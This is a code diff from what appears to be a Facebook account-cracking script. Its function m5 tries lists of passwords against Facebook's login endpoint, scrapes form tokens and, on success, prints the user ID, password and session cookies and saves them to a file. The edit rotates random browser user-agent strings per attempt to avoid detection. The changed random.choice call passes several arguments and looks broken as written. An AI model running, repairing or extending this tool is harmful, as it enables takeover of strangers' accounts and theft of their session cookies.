@@ -1140,7 +1140,7 @@ def m5(idf,pwv):
  try:
   for ps in pwv:
    session = requests.Session()
-   pro = random.choice(ugen)
+   pro = random.choice('Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.51 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.51 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPod; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.51 Mobile/15E148 Safari/604.1')
    free_fb = session.get('https://x.facebook.com').text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1163,12 +1163,12 @@ def m5(idf,pwv):
             'referer': 'https://m.facebook.com',
             'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
             'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform': '"Linux"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
-            'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',} 
+            'user-agent': pro,} 
    lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100',headers=header_freefb,data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
@@ -1179,6 +1179,7 @@ def m5(idf,pwv):
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+            print(f"\r\033[38;5;196magent=[🤖]: {pro}\33[1;36m")
             open('/sdcard/ATOM-M5-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
